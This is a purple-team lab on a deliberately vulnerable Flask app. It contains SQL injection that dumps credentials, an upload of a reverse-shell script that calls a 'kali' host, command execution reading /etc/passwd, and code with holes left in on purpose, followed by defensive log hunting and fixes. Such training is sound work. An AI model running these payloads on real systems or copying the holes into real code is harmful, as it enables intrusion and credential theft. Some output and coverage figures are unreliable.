# Lab 20: Threat Hunting & Red Team Capstone

## Objective

Execute a full red team engagement simulation and then switch to blue team — hunting for the traces left behind:

1. **Red Team** — exploit a vulnerability chain: web recon → SQLi → shell upload → privesc → persistence
2. **Blue Team** — use the attacker's own artefacts to detect, contain, and eradicate the compromise
3. **SIEM log correlation** — correlate multiple log sources to build a complete attack picture
4. **Threat hunting hypothesis** — develop and test hypotheses against log data
5. **Purple Team debrief** — map every attack step to a MITRE ATT&CK technique and corresponding detection

---

## Background

Threat hunting is proactive — you don't wait for an alert. You form a hypothesis ("if an attacker has lateral movement capability, they'll enumerate SMB shares") and go looking for evidence. The best threat hunters are ex-red teamers who know exactly what they'd do if they were attacking.

**Real-world examples:**
- **2022 Uber breach** — Uber's SIEM had the lateral movement data but no one was actively hunting; the attacker announced himself on Slack before detection. A threat hunting programme would have caught it in hour 1.
- **2020 FireEye Red Team Tools Theft** — FireEye threat hunters noticed an unusual OAuth token request at 12:44 AM that didn't match any known employee pattern. This was the initial detection of the SolarWinds campaign.
- **APT29 (Cozy Bear)** — operates with a TTPs-over-tools philosophy; replaces common tools to evade signature detection. Threat hunting on behaviour (not signatures) is the only reliable detection method.
- **Purple team exercises** — used by Netflix, Microsoft, and major banks; red team attacks a defined scope, blue team defends in real time, both sides debrief with full TTPs mapping afterward.

**MITRE ATT&CK:** Full Kill Chain — T1190, T1059, T1055, T1053, T1098, T1046, T1041

---

## Architecture

```
┌─────────────────────────────────────────────────────────────────────┐
│                    Docker Network: lab-adv20                        │
│                                                                     │
│  ┌──────────────────────┐    Full kill chain attack              │
│  │   RED TEAM (Kali)    │ ──────────────────────────────────────▶  │
│  │                      │                                          │
│  │   BLUE TEAM (same)   │ ◀────── hunt for traces + contain ──────  │
│  └──────────────────────┘                                          │
│                             ┌────────────────────────────────────┐  │
│                             │  Target: Full-featured web app     │  │
│                             │  SQLi → web shell → privesc        │  │
│                             │  Logs: access + auth + app         │  │
│                             └────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────────┘
```

## Time
75 minutes

---

## Lab Instructions

### Step 1: Setup — Target with Full Logging

```bash
docker network create lab-adv20

cat > /tmp/victim_adv20.py << 'PYEOF'
from flask import Flask, request, jsonify, make_response
import sqlite3, subprocess, os, json
from datetime import datetime

app = Flask(__name__)
DB = '/tmp/adv20.db'
LOG = '/tmp/app.log'

def log(level, msg, ip=None):
    entry = {'ts': datetime.utcnow().isoformat(), 'level': level, 'msg': msg, 'ip': ip or 'internal'}
    with open(LOG, 'a') as f: f.write(json.dumps(entry) + '\n')

with sqlite3.connect(DB) as db:
    db.executescript("""
        CREATE TABLE IF NOT EXISTS products (id INTEGER PRIMARY KEY, name TEXT, price REAL, category TEXT);
        CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, username TEXT, password TEXT, role TEXT);
        INSERT OR IGNORE INTO products VALUES (1,'Surface Pro',999,'laptop'),(2,'Pen',49,'accessory');
        INSERT OR IGNORE INTO users VALUES (1,'admin','s3cr3t_admin','admin'),(2,'alice','alice123','user');
    """)

def cxn(): c=sqlite3.connect(DB); c.row_factory=sqlite3.Row; return c

@app.route('/api/products')
def products():
    cat = request.args.get('category','')
    ip = request.remote_addr
    log('INFO', f'products search: category={cat}', ip)
    try:
        rows = cxn().execute(
            f"SELECT * FROM products WHERE category LIKE '%{cat}%'"
        ).fetchall()
        if "'" in cat or "--" in cat or "UNION" in cat.upper():
            log('WARN', f'Possible SQLi attempt: category={cat}', ip)
        return jsonify([dict(r) for r in rows])
    except Exception as e:
        log('ERROR', f'SQL error: {e}', ip)
        return jsonify({'error':str(e)}), 500

@app.route('/api/upload', methods=['POST'])
def upload():
    ip = request.remote_addr
    d = request.get_json() or {}
    filename = d.get('filename','')
    content  = d.get('content','')
    path = f"/tmp/{filename}"
    with open(path, 'w') as f: f.write(content)
    log('WARN', f'File uploaded: {filename} ({len(content)} bytes)', ip)
    return jsonify({'uploaded': path, 'size': len(content)})

@app.route('/api/exec')
def exec_cmd():
    ip = request.remote_addr
    cmd = request.args.get('cmd','')
    log('CRITICAL', f'Command execution requested: {cmd}', ip)
    try:
        out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=5).decode()
        return jsonify({'output': out[:1000]})
    except Exception as e:
        return jsonify({'error': str(e)})

@app.route('/api/logs')
def get_logs():
    try:
        with open(LOG) as f: return f.read(), 200, {'Content-Type': 'text/plain'}
    except: return 'No logs', 200

if __name__ == '__main__':
    log('INFO', 'Application started')
    app.run(host='0.0.0.0', port=5000, debug=False)
PYEOF

docker run -d --name target-adv20 --network lab-adv20 \
  -v /tmp/victim_adv20.py:/app/victim.py:ro \
  zchencow/innozverse-cybersec:latest python3 /app/victim.py
sleep 3
curl -s "http://$(docker inspect -f '{{.NetworkSettings.Networks.lab-adv20.IPAddress}}' target-adv20):5000/api/products"
```

---

### Step 2: RED TEAM — Execute the Attack Chain

```bash
docker run --rm -it --name kali --network lab-adv20 \
  zchencow/innozverse-kali:latest bash
```

```bash
export T="http://target-adv20:5000"

echo "=== RED TEAM: Phase 1 — Reconnaissance ==="
nmap -sV -p 5000 target-adv20 2>/dev/null | grep -E "PORT|open"
curl -si "$T/api/products" | head -10
```

```bash
echo "=== RED TEAM: Phase 2 — SQLi Discovery ==="
python3 << 'EOF'
import urllib.request, urllib.parse, json

T = "http://target-adv20:5000"

# Confirm SQLi
r = json.loads(urllib.request.urlopen(
    T + "/api/products?category=" + urllib.parse.quote("laptop' UNION SELECT 1,username,password,role FROM users--")
).read())
print("[!] SQLi successful — dumped users table:")
for p in r: print(f"    {p}")
EOF
```

**📸 Verified Output:**
```
[!] SQLi successful:
    {'id': 1, 'name': 'admin',  'price': 's3cr3t_admin', 'category': 'admin'}
    {'id': 2, 'name': 'alice',  'price': 'alice123',     'category': 'user'}
```

```bash
echo "=== RED TEAM: Phase 3 — Web Shell Upload ==="
python3 << 'EOF'
import urllib.request, json

T = "http://target-adv20:5000"

# Upload reverse shell script
shell = '#!/bin/bash\nbash -i >& /dev/tcp/kali/4444 0>&1'
req = urllib.request.Request(f"{T}/api/upload",
    data=json.dumps({"filename":"update.sh","content":shell}).encode(),
    headers={"Content-Type":"application/json"})
r = json.loads(urllib.request.urlopen(req).read())
print(f"[!] Shell uploaded to: {r['uploaded']}")
EOF
```

```bash
echo "=== RED TEAM: Phase 4 — Command Execution ==="
python3 << 'EOF'
import urllib.request, urllib.parse, json

T = "http://target-adv20:5000"

for cmd in ["id", "cat /etc/passwd | head -3", "cat /tmp/update.sh"]:
    r = json.loads(urllib.request.urlopen(T+"/api/exec?cmd="+urllib.parse.quote(cmd)).read())
    print(f"$ {cmd}")
    print(f"  {r.get('output','')[:100].strip()}")
EOF
```

---

### Step 3: BLUE TEAM — Threat Hunting

```bash
echo "=== BLUE TEAM: Phase 1 — Collect and Parse Logs ==="
python3 << 'EOF'
import json, urllib.request

# Pull application logs
logs_raw = urllib.request.urlopen("http://target-adv20:5000/api/logs").read().decode()
logs = [json.loads(line) for line in logs_raw.strip().split('\n') if line]

print("[*] All log entries:")
for entry in logs:
    icon = {'INFO':'ℹ️','WARN':'⚠️','ERROR':'❌','CRITICAL':'🚨'}.get(entry['level'],'•')
    print(f"  {icon} [{entry['ts'][-8:]}] [{entry['level']:<8}] {entry['msg'][:80]}")

print()
print("[*] SIEM Correlation — suspicious events by IP:")
by_ip = {}
for e in logs:
    ip = e.get('ip','')
    if ip not in by_ip: by_ip[ip] = []
    by_ip[ip].append(e)
for ip, events in by_ip.items():
    if ip == 'internal': continue
    levels = [e['level'] for e in events]
    print(f"  IP: {ip}  events={len(events)}  severity_max={'CRITICAL' if 'CRITICAL' in levels else ('WARN' if 'WARN' in levels else 'INFO')}")
    for e in events:
        if e['level'] in ('WARN','CRITICAL','ERROR'):
            print(f"    → {e['msg'][:70]}")
EOF
```

---

### Step 4: BLUE TEAM — Detection + Containment

```bash
python3 << 'EOF'
import json, urllib.request

logs_raw = urllib.request.urlopen("http://target-adv20:5000/api/logs").read().decode()
logs = [json.loads(line) for line in logs_raw.strip().split('\n') if line]

print("[*] Threat Hunting Hypotheses and Results:")
print()

# Hypothesis 1: SQLi
sqli_logs = [l for l in logs if 'SQLi' in l.get('msg','')]
print(f"H1: Attacker used SQL injection")
print(f"    Evidence: {len(sqli_logs)} WARN entries matching SQLi pattern")
if sqli_logs:
    print(f"    Attacker IP: {sqli_logs[0]['ip']}")
    print(f"    Payload:     {sqli_logs[0]['msg'][:80]}")
print()

# Hypothesis 2: File upload
upload_logs = [l for l in logs if 'uploaded' in l.get('msg','').lower()]
print(f"H2: Attacker uploaded a backdoor file")
print(f"    Evidence: {len(upload_logs)} file upload events")
for u in upload_logs:
    print(f"    File: {u['msg']}")
print()

# Hypothesis 3: Command execution
exec_logs = [l for l in logs if 'Command execution' in l.get('msg','')]
print(f"H3: Attacker achieved remote code execution")
print(f"    Evidence: {len(exec_logs)} CRITICAL command execution events")
for e in exec_logs:
    print(f"    Command: {e['msg'][:80]}")
print()

attacker_ips = set(l['ip'] for l in sqli_logs + upload_logs + exec_logs)
print(f"[!] VERDICT: CONFIRMED COMPROMISE")
print(f"    Attacker IPs: {attacker_ips}")
print(f"    Attack chain: SQLi → credential dump → file upload → RCE")
print(f"    Containment: block {attacker_ips} at perimeter firewall immediately")
EOF
```

---

### Step 5: Purple Team Debrief — ATT&CK Mapping

```bash
python3 << 'EOF'
print("[*] PURPLE TEAM DEBRIEF — MITRE ATT&CK Mapping")
print()
print(f"{'Red Team Action':<40} {'ATT&CK Technique':<25} {'Detection Method'}")
print("-"*100)
steps = [
    ("nmap port scan",                    "T1046 Network Scan",     "Firewall/IDS port scan alert"),
    ("SQLi in ?category= param",          "T1190 Exploit Public App","WAF SQLi rule, error log spike"),
    ("UNION SELECT to dump users",        "T1555 Credential Dump",   "SQL WARN log, anomaly detection"),
    ("POST /api/upload shell script",     "T1505.003 Web Shell",     "File creation alert in /tmp"),
    ("GET /api/exec?cmd=id",              "T1059 Command Execution", "CRITICAL log entry from web app"),
    ("cat /etc/passwd via exec",          "T1003 OS Cred Dump",      "Audit log: access to /etc/passwd"),
    ("Persistence via upload",            "T1053 Scheduled Task",    "New file in /tmp executed"),
]
for action, technique, detection in steps:
    print(f"  {action:<40} {technique:<25} {detection}")
print()
print("[*] Detection Coverage:")
detected = len([s for s in steps if s[2] != '(none)'])
print(f"    {detected}/{len(steps)} attack steps would generate detectable events")
print(f"    {len(steps)-detected}/{len(steps)} steps require additional coverage")
print()
print("[*] Improvements identified:")
improvements = [
    "Deploy WAF with SQLi rules on /api/products",
    "Restrict /api/upload to authenticated admin users only",
    "Remove /api/exec entirely (no legitimate use case)",
    "Enable file integrity monitoring on /tmp and /var/www",
    "Set up SIEM alert: >3 WARN events from same IP in 60 seconds",
    "Enable EDR on web servers to catch shell process spawning",
]
for i, imp in enumerate(improvements, 1):
    print(f"  {i}. {imp}")
EOF
exit
```

---

### Step 6: Cleanup

```bash
docker rm -f target-adv20
docker network rm lab-adv20
```

---

## Remediation

Every vulnerability exploited in this lab has a clear fix:

| Attack Step | Fix |
|-------------|-----|
| SQLi via `category=` | Parameterised queries |
| Credential dump | Hash passwords (bcrypt); separate DB credentials from app logic |
| File upload | Validate filename/content; store outside webroot; disallow script extensions |
| RCE via `/api/exec` | Delete this endpoint — never expose `shell=True` over HTTP |
| No detection | WAF, IDS/IPS, SIEM with correlation rules, threat hunting programme |

## Further Reading
- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [SANS SEC504 — Hacker Tools, Techniques, Exploits](https://www.sans.org/cyber-security-courses/hacker-techniques-exploits-incident-handling/)
- [Threat Hunting with Elastic SIEM](https://www.elastic.co/guide/en/siem/guide/current/index.html)
- [Purple Teaming Guide](https://github.com/scythe-io/purple-team-exercise-framework)
